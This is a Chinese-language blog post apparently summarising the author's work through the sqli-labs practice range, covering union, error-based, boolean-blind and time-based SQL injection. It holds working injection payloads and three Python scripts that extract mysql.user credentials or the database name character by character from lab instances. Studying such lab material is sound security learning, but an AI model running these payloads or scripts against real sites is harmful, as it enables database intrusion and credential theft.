<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="Basic Injection">
<meta property="og:type" content="article">
<meta property="og:title" content="Basic Injection">
<meta property="og:url" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="Basic Injection">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/1.jpg">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/2.jpg">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/5.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/7.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/12.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/17.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/19.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/20.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/21.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/22.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/23.png">
<meta property="og:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/24.png">
<meta property="article:published_time" content="2022-11-21T01:00:50.000Z">
<meta property="article:modified_time" content="2023-04-25T12:16:38.985Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/1.jpg"><title>Basic Injection | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2022/11/21/Sqli-labs-Page-1/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">About</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Basic Injection</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-11-21</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-04-25</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><hr>

        <h2 id="慢慢亦灿灿，历经一个月左右终于将sqlilabs第一章刷完；至此也对sql注入的原理和基础姿势有了一定的了解；今天打算记录一下我在这个靶场学习到的东西">
          <a href="#慢慢亦灿灿，历经一个月左右终于将sqlilabs第一章刷完；至此也对sql注入的原理和基础姿势有了一定的了解；今天打算记录一下我在这个靶场学习到的东西" class="heading-link"><i class="fas fa-link"></i></a><a href="#慢慢亦灿灿，历经一个月左右终于将sqlilabs第一章刷完；至此也对sql注入的原理和基础姿势有了一定的了解；今天打算记录一下我在这个靶场学习到的东西" class="headerlink" title="慢慢亦灿灿，历经一个月左右终于将sqlilabs第一章刷完；至此也对sql注入的原理和基础姿势有了一定的了解；今天打算记录一下我在这个靶场学习到的东西"></a>慢慢亦灿灿，历经一个月左右终于将sqlilabs第一章刷完；至此也对sql注入的原理和基础姿势有了一定的了解；今天打算记录一下我在这个靶场学习到的东西</h2>
      <hr>

        <h2 id="一-基础的注入姿势：">
          <a href="#一-基础的注入姿势：" class="heading-link"><i class="fas fa-link"></i></a><a href="#一-基础的注入姿势：" class="headerlink" title="一.基础的注入姿势："></a>一.基础的注入姿势：</h2>
      
        <h2 id="1：联合注入">
          <a href="#1：联合注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#1：联合注入" class="headerlink" title="1：联合注入"></a>1：联合注入</h2>
      <p>(1)解读：<br>MYSQL规定联合注入的查询,union关键字连接的两个查询语句，查询的字段数必须保持一致。此时我们分析一下当我们输入?id&#x3D;1的时候后台的查询逻辑：select id,password,username from users where id&#x3D;1<br>此时我们发现union左边的查询语句有三个字段；所以我们右边的查询语句也应该有三个字段。可是我们在注入攻击前我们并不知道一共有几个字段；所以我们就需要使用order by进行查询<br>此时我们看一下联合注入的效果<br><img src="/2022/11/21/Sqli-labs-Page-1/1.jpg"><br>但页面只能展示第一条数据，想让页面展示第二条数据，可以使用分页limit x,y，但这里我们使用另外一种方<br>：空查询;正常的用户id都是从1开始自增的，如果查询的id为0或者是负数，一定是空查询。<br><img src="/2022/11/21/Sqli-labs-Page-1/2.jpg"><br>(2)使用前提：<br>页面有显示位，这个显示位指的是网页中能够显示数据的位置。<br>显示位：服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位<br>有显示位：<br><img src="/2022/11/21/Sqli-labs-Page-1/3.png"><br>无显示位：<br><img src="/2022/11/21/Sqli-labs-Page-1/4.png"></p>
<hr>

        <h2 id="2-报错注入">
          <a href="#2-报错注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h2>
      <p>(1)解读：MySQL提供了一个updatexml()函数和extractvalue()函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。这个在Less-17 Dumb Hacker这篇文章中有详细介绍，有疑惑的就看这篇<br>文章啦。<br>使用前提：页面有数据库的报错信息，一般是?id&#x3D;1’先试探一下，然后继续?id&#x3D;1’ and updatexml(1,’0x7e’,3)再次试探；如果页面有报错，且报错信息回显正常的话，便可以试着进行报错注入。<br>报错信息正常：<br><img src="/2022/11/21/Sqli-labs-Page-1/5.png"><br>无报错信息：<br><img src="/2022/11/21/Sqli-labs-Page-1/6.png"></p>
<hr>

        <h2 id="3-布尔盲注">
          <a href="#3-布尔盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-布尔盲注" class="headerlink" title="3.布尔盲注"></a>3.布尔盲注</h2>
      
        <h2 id="页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。这一部分我在初识盲注里面有解释过；这里就不过多解释了使用前提：页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。同时满足以下两种情况：-id-x3D-1’-and-1-x3D-1-正常显示-id-x3D-1’-and-1-x3D-0-异常-空-显示可以使用布尔盲注的情况不可以使用布尔盲注的情况因为布尔手工盲注耗时较长且繁琐，所以有两种方法1-借助bp的爆破模块进行辅助或者2-使用脚本进行爆破get请求盲注脚本：post请求盲注脚本：">
          <a href="#页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。这一部分我在初识盲注里面有解释过；这里就不过多解释了使用前提：页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。同时满足以下两种情况：-id-x3D-1’-and-1-x3D-1-正常显示-id-x3D-1’-and-1-x3D-0-异常-空-显示可以使用布尔盲注的情况不可以使用布尔盲注的情况因为布尔手工盲注耗时较长且繁琐，所以有两种方法1-借助bp的爆破模块进行辅助或者2-使用脚本进行爆破get请求盲注脚本：post请求盲注脚本：" class="heading-link"><i class="fas fa-link"></i></a><a href="#页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。这一部分我在初识盲注里面有解释过；这里就不过多解释了使用前提：页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。同时满足以下两种情况：-id-x3D-1’-and-1-x3D-1-正常显示-id-x3D-1’-and-1-x3D-0-异常-空-显示可以使用布尔盲注的情况不可以使用布尔盲注的情况因为布尔手工盲注耗时较长且繁琐，所以有两种方法1-借助bp的爆破模块进行辅助或者2-使用脚本进行爆破get请求盲注脚本：post请求盲注脚本：" class="headerlink" title="页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。这一部分我在初识盲注里面有解释过；这里就不过多解释了使用前提：页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。同时满足以下两种情况：?id&#x3D;1’ and 1&#x3D;1# 正常显示?id&#x3D;1’ and 1&#x3D;0# 异常(空)显示可以使用布尔盲注的情况不可以使用布尔盲注的情况因为布尔手工盲注耗时较长且繁琐，所以有两种方法1.借助bp的爆破模块进行辅助或者2.使用脚本进行爆破get请求盲注脚本：post请求盲注脚本："></a>页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。这一部分我在初识盲注里面有解释过；这里就不过多解释了<br>使用前提：页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。<br>同时满足以下两种情况：<br>?id&#x3D;1’ and 1&#x3D;1# 正常显示<br>?id&#x3D;1’ and 1&#x3D;0# 异常(空)显示<br>可以使用布尔盲注的情况<br><img src="/2022/11/21/Sqli-labs-Page-1/7.png"><br><img src="/2022/11/21/Sqli-labs-Page-1/8.png"><br>不可以使用布尔盲注的情况<br><img src="/2022/11/21/Sqli-labs-Page-1/9.png"><br><img src="/2022/11/21/Sqli-labs-Page-1/10.png"><br>因为布尔手工盲注耗时较长且繁琐，所以有两种方法1.借助bp的爆破模块进行辅助或者2.使用脚本进行爆破<br>get请求盲注脚本：<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 只需要修改url 和 两个payload即可</span><br><span class="line"># 目标网址（不带参数）</span><br><span class="line">url = &quot;http://3534c6c2bffd4225bf3409ae9a2ec278.app.mituan.zone/Less-5/&quot;</span><br><span class="line"># 猜解长度使用的payload</span><br><span class="line">payload_len = &quot;&quot;&quot;?id=1&#x27; and length(</span><br><span class="line">                  (select group_concat(user,password)</span><br><span class="line">                    from mysql.user)</span><br><span class="line">                ) &lt; &#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="line"># 枚举字符使用的payload</span><br><span class="line">payload_str = &quot;&quot;&quot;?id=1&#x27; and ascii(</span><br><span class="line">                  substr(</span><br><span class="line">                    (select group_concat(user,password)</span><br><span class="line">                    from mysql.user)</span><br><span class="line">                  ,&#123;n&#125;,1)</span><br><span class="line">                ) = &#123;r&#125; -- a&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 获取长度</span><br><span class="line">def getLength(url, payload):</span><br><span class="line">    length = 1  # 初始测试长度为1</span><br><span class="line">    while True:</span><br><span class="line">        response = requests.get(url= url+payload_len.format(n= length))</span><br><span class="line">        # 页面中出现此内容则表示成功</span><br><span class="line">        if &#x27;You are in...........&#x27; in response.text:</span><br><span class="line">            print(&#x27;测试长度完成，长度为：&#x27;, length,)</span><br><span class="line">            return length;</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;正在测试长度：&#x27;,length)</span><br><span class="line">            length += 1  # 测试长度递增</span><br><span class="line"></span><br><span class="line"># 获取字符</span><br><span class="line">def getStr(url, payload, length):</span><br><span class="line">    str = &#x27;&#x27;  # 初始表名/库名为空</span><br><span class="line">    # 第一层循环，截取每一个字符</span><br><span class="line">    for l in range(1, length+1):</span><br><span class="line">        # 第二层循环，枚举截取字符的每一种可能性</span><br><span class="line">        for n in range(33, 126):</span><br><span class="line">            response = requests.get(url= url+payload_str.format(n= l, r= n))</span><br><span class="line">            # 页面中出现此内容则表示成功</span><br><span class="line">            if &#x27;You are in...........&#x27; in response.text:</span><br><span class="line">                str+= chr(n)</span><br><span class="line">                print(&#x27;第&#x27;, l, &#x27;个字符猜解成功：&#x27;, str)</span><br><span class="line">                break;</span><br><span class="line">    return str;</span><br><span class="line"></span><br><span class="line"># 开始猜解</span><br><span class="line">length = getLength(url, payload_len)</span><br><span class="line">getStr(url, payload_str, length)</span><br></pre></td></tr></table></div></figure><br>post请求盲注脚本：<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 网站路径</span><br><span class="line">url = &quot;http://7eb82265178a435aa86d6728e7b1e08a.app.mituan.zone/Less-13/&quot;</span><br><span class="line"># 判断长度的payload</span><br><span class="line">payload_len = &quot;&quot;&quot;a&#x27;) or length(</span><br><span class="line">                    (select group_concat(user,password) </span><br><span class="line">                     from mysql.user)</span><br><span class="line">                )&gt;&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="line"># 枚举字符的payload</span><br><span class="line">payload_str = &quot;&quot;&quot;a&#x27;) or ascii(</span><br><span class="line">                    substr(</span><br><span class="line">                        (select group_concat(user,password)</span><br><span class="line">                        from mysql.user)</span><br><span class="line">                    ,&#123;l&#125;,1)</span><br><span class="line">                )=&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># post请求参数</span><br><span class="line">data= &#123;</span><br><span class="line">    &quot;uname&quot; : &quot;a&#x27;) or 1 -- a&quot;,</span><br><span class="line">    &quot;passwd&quot; : &quot;1&quot;,</span><br><span class="line">    &quot;submit&quot; : &quot;Submit&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 判断长度</span><br><span class="line">def getLen(payload_len):</span><br><span class="line">    length = 1</span><br><span class="line">    while True:</span><br><span class="line">        # 修改请求参数</span><br><span class="line">        data[&quot;uname&quot;] = payload_len.format(n = length)</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        # 出现此内容为登录成功</span><br><span class="line">        if &#x27;../images/flag.jpg&#x27; in response.text:</span><br><span class="line">            print(&#x27;正在测试长度：&#x27;, length)</span><br><span class="line">            length += 1</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;测试成功，长度为：&#x27;, length)</span><br><span class="line">            return length;</span><br><span class="line"></span><br><span class="line"># 枚举字符</span><br><span class="line">def getStr(length):</span><br><span class="line">    str = &#x27;&#x27;</span><br><span class="line">    # 从第一个字符开始截取</span><br><span class="line">    for l in range(1, length+1):</span><br><span class="line">        # 枚举字符的每一种可能性</span><br><span class="line">        for n in range(32, 126):</span><br><span class="line">            data[&quot;uname&quot;] = payload_str.format(l=l, n=n)</span><br><span class="line">            response = requests.post(url=url, data=data)</span><br><span class="line">            if &#x27;../images/flag.jpg&#x27; in response.text:</span><br><span class="line">                str += chr(n)</span><br><span class="line">                print(&#x27;第&#x27;, l, &#x27;个字符枚举成功：&#x27;,str )</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">length = getLen(payload_len)</span><br><span class="line">getStr(length)</span><br></pre></td></tr></table></div></figure></h2>
      
        <h2 id="4：时间盲注">
          <a href="#4：时间盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#4：时间盲注" class="headerlink" title="4：时间盲注"></a>4：时间盲注</h2>
      
        <h2 id="使用场景：-1-页面没有回显位置-联合注入无法使用-2-页面不显示数据库的报错信息（报错注入无法使用）-3-无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）这一部分我在初识盲注里面有解释过；这里就不过多解释了。因为时间盲注会受到网络不稳定的影响和其本身的繁琐程度，我们一般会使用bp进行辅助或者使用脚本盲注脚本">
          <a href="#使用场景：-1-页面没有回显位置-联合注入无法使用-2-页面不显示数据库的报错信息（报错注入无法使用）-3-无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）这一部分我在初识盲注里面有解释过；这里就不过多解释了。因为时间盲注会受到网络不稳定的影响和其本身的繁琐程度，我们一般会使用bp进行辅助或者使用脚本盲注脚本" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用场景：-1-页面没有回显位置-联合注入无法使用-2-页面不显示数据库的报错信息（报错注入无法使用）-3-无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）这一部分我在初识盲注里面有解释过；这里就不过多解释了。因为时间盲注会受到网络不稳定的影响和其本身的繁琐程度，我们一般会使用bp进行辅助或者使用脚本盲注脚本" class="headerlink" title="使用场景：(1):页面没有回显位置(联合注入无法使用)(2):页面不显示数据库的报错信息（报错注入无法使用）(3)无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）这一部分我在初识盲注里面有解释过；这里就不过多解释了。因为时间盲注会受到网络不稳定的影响和其本身的繁琐程度，我们一般会使用bp进行辅助或者使用脚本盲注脚本"></a>使用场景：(1):页面没有回显位置(联合注入无法使用)(2):页面不显示数据库的报错信息（报错注入无法使用）<br>(3)无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）<br>这一部分我在初识盲注里面有解释过；这里就不过多解释了。<br>因为时间盲注会受到网络不稳定的影响和其本身的繁琐程度，我们一般会使用bp进行辅助或者使用脚本<br>盲注脚本<br><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 将url 替换成你的靶场关卡网址</span><br><span class="line"># 修改两个对应的payload</span><br><span class="line"></span><br><span class="line"># 目标网址（不带参数）</span><br><span class="line">url = &quot;http://0f3687d08b574476ba96442b3ec2c120.app.mituan.zone/Less-9/&quot;</span><br><span class="line"># 猜解长度使用的payload</span><br><span class="line">payload_len = &quot;&quot;&quot;?id=1&#x27; and if(</span><br><span class="line">  (length(database()) =&#123;n&#125;)</span><br><span class="line">,sleep(5),3) -- a&quot;&quot;&quot;</span><br><span class="line"># 枚举字符使用的payload</span><br><span class="line">payload_str = &quot;&quot;&quot;?id=1&#x27; and if(</span><br><span class="line">  (ascii(</span><br><span class="line">    substr(</span><br><span class="line">    (database())</span><br><span class="line">    ,&#123;n&#125;,1)</span><br><span class="line">  ) =&#123;r&#125;)</span><br><span class="line">, sleep(5), 3) -- a&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 获取长度</span><br><span class="line">def getLength(url, payload):</span><br><span class="line">    length = 1  # 初始测试长度为1</span><br><span class="line">    while True:</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = requests.get(url= url+payload_len.format(n= length))</span><br><span class="line">        # 页面响应时间 = 结束执行的时间 - 开始执行的时间</span><br><span class="line">        use_time = time.time() - start_time</span><br><span class="line">        # 响应时间&gt;5秒时，表示猜解成功</span><br><span class="line">        if use_time &gt; 5:</span><br><span class="line">            print(&#x27;测试长度完成，长度为：&#x27;, length,)</span><br><span class="line">            return length;</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;正在测试长度：&#x27;,length)</span><br><span class="line">            length += 1  # 测试长度递增</span><br><span class="line"></span><br><span class="line"># 获取字符</span><br><span class="line">def getStr(url, payload, length):</span><br><span class="line">    str = &#x27;&#x27;  # 初始表名/库名为空</span><br><span class="line">    # 第一层循环，截取每一个字符</span><br><span class="line">    for l in range(1, length+1):</span><br><span class="line">        # 第二层循环，枚举截取字符的每一种可能性</span><br><span class="line">        for n in range(33, 126):</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.get(url= url+payload_str.format(n= l, r= n))</span><br><span class="line">            # 页面响应时间 = 结束执行的时间 - 开始执行的时间</span><br><span class="line">            use_time = time.time() - start_time</span><br><span class="line">            # 页面中出现此内容则表示成功</span><br><span class="line">            if use_time &gt; 5:</span><br><span class="line">                str+= chr(n)</span><br><span class="line">                print(&#x27;第&#x27;, l, &#x27;个字符猜解成功：&#x27;, str)</span><br><span class="line">                break;</span><br><span class="line">    return str;</span><br><span class="line"></span><br><span class="line"># 开始猜解</span><br><span class="line">length = getLength(url, payload_len)</span><br><span class="line">getStr(url, payload_str, length)</span><br></pre></td></tr></table></div></figure></h2>
      
        <h2 id="一般是先考虑使用联合注入-gt-报错注入-gt-布尔盲注-gt-时间盲注">
          <a href="#一般是先考虑使用联合注入-gt-报错注入-gt-布尔盲注-gt-时间盲注" class="heading-link"><i class="fas fa-link"></i></a><a href="#一般是先考虑使用联合注入-gt-报错注入-gt-布尔盲注-gt-时间盲注" class="headerlink" title="一般是先考虑使用联合注入&gt;报错注入&gt;布尔盲注&gt;时间盲注"></a>一般是先考虑使用联合注入&gt;报错注入&gt;布尔盲注&gt;时间盲注</h2>
      
        <h2 id="二-SQL语句中的函数：">
          <a href="#二-SQL语句中的函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#二-SQL语句中的函数：" class="headerlink" title="二.SQL语句中的函数："></a>二.SQL语句中的函数：</h2>
      <ol>
<li>group_concat(field1,field2…):将多行的查询结果拼接成一行<br><img src="/2022/11/21/Sqli-labs-Page-1/11.png"><br><img src="/2022/11/21/Sqli-labs-Page-1/12.png"></li>
<li>concat(obj1，obj2，……)：将多个内容拼接为一个字符串；使用报错注入时，经常使用此函数拼接特殊符号和查询语句，以使查询结果可以出现在页面的报错信息中<br><img src="/2022/11/21/Sqli-labs-Page-1/13.png"><br><img src="/2022/11/21/Sqli-labs-Page-1/14.png"></li>
<li>length(obj):返回字符串或者查询结果的长度<br><img src="/2022/11/21/Sqli-labs-Page-1/15.png"><br><img src="/2022/11/21/Sqli-labs-Page-1/16.png"></li>
